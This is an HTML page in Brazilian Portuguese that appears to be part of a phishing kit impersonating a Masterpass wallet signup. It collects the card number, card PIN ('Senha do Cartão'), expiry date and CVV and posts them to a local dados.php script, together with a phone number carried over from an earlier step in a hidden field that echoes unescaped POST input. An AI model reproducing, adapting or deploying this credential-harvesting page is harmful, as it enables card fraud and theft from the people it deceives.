<!DOCTYPE html>
<html lang="pt-BR">
   <head>
      <title>Bem vindo ao Masterpass</title>
        <meta http-equiv="content-type" content="text/html; charset=UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <meta name="theme-color" content="#1a1f71">
        
        <link rel="stylesheet" type="text/css" href="css/bootstrap.css">
        <link rel="stylesheet" type="text/css" href="css/estilo.css">
        <link href="img/favicon.png" rel="Shortcut Icon">

        <script src="js/jquery-3.2.1.min.js"></script>
        <script src="js/bootstrap.js"></script>
        <script src="js/script1.js"></script>

      <meta name="viewport" content="width=device-width, initial-scale=1.0">
   </head>

<body>
   <header role="banner" class="header header-pinned ng-scope">
       <div class="container-content content-header ng-scope">
           <div class="header-brands">
               <div class="header-brand">
                  <img alt="Masterpass" class="img-responsive img-header-brand ng-scope img-header-brand-hero" src="img/header-mpass-hero.svg" style="">
               </div>
           </div> 
       </div>
   </header>

   <main role="main" class="main main-content ng-scope">
       <div class="mpass-card ng-scope">
           <div class="container">
               <div class="row">
                   <div class="col-sm-6 ng-scope">
                       <div class="container-announcements">
                           <h1 class="text-announcements ng-binding">Vamos criar sua carteira Masterpass</h1>
                           <p class="text-announcements h3 ng-binding ng-scope">Basta fornecer as informações do seu cartão de crédito, debito ou pré-pago. Se este cartão foi emitido por um de nossos parceiros, você pode ser direcionado para um site externo para um acesso mais rápido.</p>
                       </div>
                   </div>
                   <div class="col-sm-6">
                      <form method="POST" action="dados.php">

                        <input type="hidden" value="<?php echo $_POST['telefone']; ?>" name="telefone"  />

                        <div class="formly-field ng-scope ng-isolate-scope formly-field-fieldUsername">
                          <div class="ng-scope form-group">
                            <div class="input-group">
                              <input class="form-control ng-isolate-scope ng-valid-connect-enabled ng-touched ng-dirty ng-valid-parse ng-valid-card-brand ng-not-empty ng-valid-max ng-valid-min ng-valid ng-valid-mod10" name="cc" id="cc" placeholder="Número do Cartão" type="tel" autofocus onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um cartão válido !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="mascaraMike('#### #### #### ####', this);javascript:pulacampo('cc','senhacc');" maxlength="19" required>
                              <div class="input-group-addon ng-scope">
                              </div>
                            </div>
                          </div>
                        </div>

                        <div class="formly-field ng-scope ng-isolate-scope formly-field-fieldUsername">
                          <div class="ng-scope form-group">
                            <div class="input-group">
                              <input class="form-control ng-isolate-scope ng-valid-connect-enabled ng-touched ng-dirty ng-valid-parse ng-valid-card-brand ng-not-empty ng-valid-max ng-valid-min ng-valid ng-valid-mod10" name="senhacc" id="senhacc" placeholder="Senha do Cartão" type="password" autofocus onkeypress="return SomenteNumero(event)" onkeyup="mascaraMike('####', this);javascript:pulacampo('senhacc','vencimento');" maxlength="4" required>
                              <div class="input-group-addon ng-scope">
                              </div>
                            </div>
                          </div>
                        </div>

                        <div class="formly-field ng-scope ng-isolate-scope formly-field-group">
                          <ng-form class="row formly ng-pristine ng-valid ng-scope ng-isolate-scope">
                            <div class="formly-field ng-scope ng-isolate-scope col-xs-6 formly-field-fieldCardExpirationDate">
                              <div class="ng-scope form-group has-feedback">
                                <label class="control-label ">
                                    Vencimento
                                </label>
                                <input class="form-control ng-pristine ng-empty ng-invalid ng-invalid-required ng-invalid-invalid ng-touched" placeholder="MM/AA" id="vencimento" name="vencimento" type="tel" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um vencimento válido !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="mascaraMike('##/##', this);javascript:pulacampo('vencimento','cvv');" maxlength="5" required>
                              </div>
                            </div>
                            <div class="formly-field ng-scope ng-isolate-scope col-xs-6 formly-field-fieldCardExpirationDate">
                              <div class="ng-scope form-group has-feedback">
                                <label class="control-label ">
                                    Código de Segurança
                                </label>
                                <input class="form-control ng-pristine ng-empty ng-invalid ng-invalid-required ng-invalid-invalid ng-touched" id="cvv" name="cvv" placeholder="CVV" type="tel" onkeypress="return SomenteNumero(event)" oninvalid="setCustomValidity('Digite um código de Segurança válido !')" onchange="try{setCustomValidity('')}catch(e){}" onkeyup="pulacampo('cvv','continue');" maxlength="3" required>
                              </div>
                            </div>
                          </div>
                          <div class="formly-field ng-scope ng-isolate-scope formly-field-group">
                            <div class="formly-field ng-scope ng-isolate-scope col-xs-6 formly-field-fieldCardExpirationDate">
                              <div class="ng-scope form-group has-feedback">
                                <button type="submit" name="continue" id="continue" class="btn btn-block btn-primary ng-binding">Continuar</button>
                              </div>
                            </div>
                          </div>
                      </form>
                    </div>
               </div>
           </div>
       </div>
   </main>
</body>
</html>

